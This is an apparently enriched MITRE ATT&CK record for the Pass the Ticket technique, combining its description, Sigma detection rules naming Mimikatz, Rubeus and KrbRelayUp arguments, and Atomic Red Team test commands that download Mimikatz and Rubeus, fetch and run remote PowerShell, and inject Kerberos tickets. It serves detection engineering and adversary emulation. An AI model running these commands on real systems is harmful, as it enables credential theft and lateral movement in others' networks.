{
    "id": "T1550.003",
    "name": "Pass the Ticket",
    "description": "Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\nWhen preforming PtT, valid Kerberos tickets for [Valid Accounts](T1078) are captured by [OS Credential Dumping](T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)\nA [Silver Ticket](T1558.002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)\nA [Golden Ticket](T1558.001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](T1550.002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)",
    "platforms": "Windows",
    "kill_chain_phases": "Defense Evasion, Lateral Movement",
    "data_sources": "User Account: User Account Authentication, Logon Session: Logon Session Creation, Active Directory: Active Directory Credential Request",
    "detection": "Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.\nEvent ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to \"Integrity check on decrypted field failed\" and indicates misuse by a previously invalidated golden ticket.(Citation: CERT-EU Golden Ticket Protection)",
    "url": "https://attack.mitre.org/techniques/T1550/003",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1550.003",
                "atomic_attack_guid": "dbf38128-7ba7-4776-bedf-cc2eed432098",
                "atomic_attack_name": "Mimikatz Kerberos Ticket Attack",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "HackTool - Mimikatz Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml",
                        "remote_content": "title: HackTool - Mimikatz Execution\nid: a642964e-bead-4bed-8910-1bb4d63e3b4d\nstatus: test\ndescription: Detection well-known mimikatz command line arguments\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://tools.thehacker.recipes/mimikatz/modules\nauthor: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional keywords), Tim Shelton\ndate: 2019-10-22\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.t1003.001\n    - attack.t1003.002\n    - attack.t1003.004\n    - attack.t1003.005\n    - attack.t1003.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_tools_name:\n        CommandLine|contains:\n            - 'DumpCreds'\n            - 'mimikatz'\n    selection_function_names: # To cover functions from modules that are not in module_names\n        CommandLine|contains:\n            - '::aadcookie' # misc module\n            - '::detours' # misc module\n            - '::memssp' # misc module\n            - '::mflt' # misc module\n            - '::ncroutemon' # misc module\n            - '::ngcsign' # misc module\n            - '::printnightmare' # misc module\n            - '::skeleton' # misc module\n            - '::preshutdown'  # service module\n            - '::mstsc'  # ts module\n            - '::multirdp'  # ts module\n    selection_module_names:\n        CommandLine|contains:\n            - 'rpc::'\n            - 'token::'\n            - 'crypto::'\n            - 'dpapi::'\n            - 'sekurlsa::'\n            - 'kerberos::'\n            - 'lsadump::'\n            - 'privilege::'\n            - 'process::'\n            - 'vault::'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Mimikatz PassTheTicket CommandLine Parameters",
                        "rule_link": "https://research.splunk.com/endpoint/13bbd574-83ac-11ec-99d4-acde48001122/"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "7b211ac6-c815-4189-93a9-ab415deca926",
                    "e54979bd-c5f9-4d6c-967b-a04b19ac4c74",
                    "7ec2c172-dceb-4c10-92c9-87c1881b7e18",
                    "12827a56-61a4-476a-a9cb-f3068f191073"
                ],
                "lookup_results": [
                    {
                        "uuid": "7b211ac6-c815-4189-93a9-ab415deca926",
                        "lookup_data": {
                            "capec": "CAPEC-645",
                            "mitre-attack-id": "T1550.003",
                            "mitre-cti:description": "Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nWhen preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)\n\nA [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)\n\nA [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)\n\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)",
                            "mitre-cti:name": "Pass the Ticket",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Vincent Le Toux', 'Ryan Becwar'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--7b211ac6-c815-4189-93a9-ab415deca926', 'type': 'attack-pattern', 'created': '2020-01-30T17:03:43.072Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1550.003', 'url': 'https://attack.mitre.org/techniques/T1550/003'}, {'external_id': 'CAPEC-645', 'source_name': 'capec', 'url': 'https://capec.mitre.org/data/definitions/645.html'}, {'url': 'https://adsecurity.org/?p=556', 'description': 'Metcalf, S. (2014, November 22). Mimikatz and Active Directory Kerberos Attacks. Retrieved June 2, 2016.', 'source_name': 'ADSecurity AD Kerberos Attacks'}, {'url': 'http://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos', 'description': 'Deply, B. (2014, January 13). Pass the ticket. Retrieved June 2, 2016.', 'source_name': 'GentilKiwi Pass the Ticket'}, {'url': 'http://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf', 'description': 'Campbell, C. (2014). The Secret Life of Krbtgt. Retrieved December 4, 2014.', 'source_name': 'Campbell 2014'}, {'source_name': 'Stealthbits Overpass-the-Hash', 'url': 'https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/', 'description': 'Warren, J. (2019, February 26). How to Detect Overpass-the-Hash Attacks. Retrieved February 4, 2021.'}, {'url': 'https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf', 'description': 'Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016, April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.', 'source_name': 'CERT-EU Golden Ticket Protection'}], 'modified': '2021-08-31T19:56:31.341Z', 'name': 'Pass the Ticket', 'description': 'Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account\\'s password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\\n\\nWhen preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user\\'s service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)\\n\\nA [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)\\n\\nA [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)\\n\\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}], 'x_mitre_detection': 'Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.\\n\\nEvent ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to \"Integrity check on decrypted field failed\" and indicates misuse by a previously invalidated golden ticket.(Citation: CERT-EU Golden Ticket Protection)', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.1', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['User Account: User Account Authentication', 'Active Directory: Active Directory Credential Request', 'Logon Session: Logon Session Creation'], 'x_mitre_defense_bypassed': ['System Access Controls'], 'x_mitre_system_requirements': ['Kerberos authentication enabled']}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e54979bd-c5f9-4d6c-967b-a04b19ac4c74",
                        "lookup_data": {
                            "description": "Detects suspicious outbound network activity via kerberos default port indicating possible lateral movement or first stage PrivEsc via delegation.",
                            "raw": "author: Ilyas Ochkov, oscd.community\ndate: 2019/10/24\ndescription: Detects suspicious outbound network activity via kerberos default port\n  indicating possible lateral movement or first stage PrivEsc via delegation.\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_exact:\n    Image:\n    - C:\\Windows\\System32\\lsass.exe\n    - C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n    - C:\\Program Files\\Mozilla Firefox\\firefox.exe\n  selection:\n    DestinationPort: 88\n    Initiated: 'true'\nfalsepositives:\n- Web Browsers\nid: e54979bd-c5f9-4d6c-967b-a04b19ac4c74\nlevel: high\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2023/01/30\nreferences:\n- https://github.com/GhostPack/Rubeus\nrelated:\n- id: eca91c7c-9214-47b9-b4c5-cb1d7e4f2350\n  type: similar\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1558\n- attack.lateral_movement\n- attack.t1550.003\ntitle: Suspicious Outbound Kerberos Connection\n",
                            "sigma:id": "e54979bd-c5f9-4d6c-967b-a04b19ac4c74",
                            "title": "Suspicious Outbound Kerberos Connection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7ec2c172-dceb-4c10-92c9-87c1881b7e18",
                        "lookup_data": {
                            "description": "Detects the execution of the hacktool Rubeus via PE information of command line parameters",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/12/19\ndescription: Detects the execution of the hacktool Rubeus via PE information of command\n  line parameters\ndetection:\n  condition: selection\n  selection:\n  - Image|endswith: \\Rubeus.exe\n  - OriginalFileName: Rubeus.exe\n  - Description: Rubeus\n  - CommandLine|contains:\n    - ' asreproast '\n    - ' dump /service:krbtgt '\n    - ' dump /luid:0x'\n    - ' kerberoast '\n    - ' createnetonly /program:'\n    - ' ptt /ticket:'\n    - ' /impersonateuser:'\n    - ' renew /ticket:'\n    - ' asktgt /user:'\n    - ' harvest /interval:'\n    - ' s4u /user:'\n    - ' s4u /ticket:'\n    - ' hash /password:'\n    - ' golden /aes256:'\n    - ' silver /user:'\nfalsepositives:\n- Unlikely\nid: 7ec2c172-dceb-4c10-92c9-87c1881b7e18\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/11\nreferences:\n- https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/\n- https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n- https://github.com/GhostPack/Rubeus\nstatus: stable\ntags:\n- attack.credential_access\n- attack.t1003\n- attack.t1558.003\n- attack.lateral_movement\n- attack.t1550.003\ntitle: Rubeus Hack Tool\n",
                            "sigma:id": "7ec2c172-dceb-4c10-92c9-87c1881b7e18",
                            "title": "Rubeus Hack Tool",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "12827a56-61a4-476a-a9cb-f3068f191073",
                        "lookup_data": {
                            "description": "Detects KrbRelayUp used to perform a universal no-fix local privilege escalation in windows domain environments where LDAP signing is not enforced",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/04/26\ndescription: Detects KrbRelayUp used to perform a universal no-fix local privilege\n  escalation in windows domain environments where LDAP signing is not enforced\ndetection:\n  condition: 1 of selection*\n  selection_flags1:\n    CommandLine|contains|all:\n    - ' relay '\n    - ' -Domain '\n    - ' -ComputerName '\n  selection_flags2:\n    CommandLine|contains|all:\n    - ' krbscm '\n    - ' -sc '\n  selection_flags3:\n    CommandLine|contains|all:\n    - ' spawn '\n    - ' -d '\n    - ' -cn '\n    - ' -cp '\n  selection_name:\n    Image|endswith: \\KrbRelayUp.exe\n  selection_original_name:\n    OriginalFileName: KrbRelayUp.exe\nfalsepositives:\n- Unlikely\nid: 12827a56-61a4-476a-a9cb-f3068f191073\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/04/27\nreferences:\n- https://github.com/Dec0ne/KrbRelayUp\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1558.003\n- attack.lateral_movement\n- attack.t1550.003\ntitle: KrbRelayUp Hack Tool\n",
                            "sigma:id": "12827a56-61a4-476a-a9cb-f3068f191073",
                            "title": "KrbRelayUp Hack Tool",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1550.003",
                "display_name": "Use Alternate Authentication Material: Pass the Ticket",
                "atomic_tests": [
                    {
                        "name": "Mimikatz Kerberos Ticket Attack",
                        "auto_generated_guid": "dbf38128-7ba7-4776-bedf-cc2eed432098",
                        "description": "Similar to PTH, but attacking Kerberos\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "ticket": {
                                "description": "Ticket file name usually format of 'id-username\\@domain.kirbi' (e.g. can be dumped by \"sekurlsa::tickets /export\" module)",
                                "type": "string",
                                "default": null
                            },
                            "mimikatz_exe": {
                                "description": "Path of the Mimikatz binary",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\bin\\x64\\mimikatz.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n",
                                "prereq_command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
                            }
                        ],
                        "executor": {
                            "command": "\"#{mimikatz_exe}\" \"kerberos::ptt #{ticket}\"\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Rubeus Kerberos Pass The Ticket",
                        "auto_generated_guid": "a2fc4ec5-12c6-4fb4-b661-961f23f359cb",
                        "description": "Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).\nPsExec is used to execute commands on the remote system, and the \"C$\" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "target": {
                                "description": "Remote system to request the TGT from",
                                "type": "string",
                                "default": "localhost"
                            },
                            "user_name": {
                                "description": "username associated with the ticket (privileged account not required)",
                                "type": "string",
                                "default": "Administrator"
                            },
                            "password": {
                                "description": "password for user_name",
                                "type": "string",
                                "default": "Password"
                            },
                            "domain": {
                                "description": "domain",
                                "type": "string",
                                "default": "$Env:USERDOMAIN"
                            },
                            "rubeus_url": {
                                "description": "URL of Rubeus executable",
                                "type": "url",
                                "default": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Rubeus must exist on disk at \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\"\n",
                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-Webrequest -Uri #{rubeus_url} -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\"\n"
                            },
                            {
                                "description": "PsExec must exist on disk at \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\"\n",
                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n"
                            }
                        ],
                        "executor": {
                            "name": "powershell",
                            "elevation_required": true,
                            "command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula \\\\#{target} -w c:\\ -c \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi\nSet-Location \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nMove-Item -Force \"\\\\#{target}\\c$\\ticket.kirbi\" ticket.kirbi\nWrite-Host \"Successfully retrieved TGT from '#{target}', now requesting a TGS from local\"\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\ticket.kirbi\"\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" purge      "
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 15:57:10"
}